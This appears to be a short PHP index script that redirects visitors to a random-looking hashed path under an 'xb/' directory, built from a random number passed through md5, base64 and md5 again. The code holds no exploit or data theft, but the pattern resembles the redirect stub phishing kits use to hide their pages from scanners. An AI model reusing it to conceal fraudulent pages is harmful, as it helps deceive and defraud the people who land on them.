<?
$random=rand(0,100);
$md5=md5("$random");
$base=base64_encode($md5);
$dst=md5("$base");
$src="xb/$dst";
header("location: $src");
?> 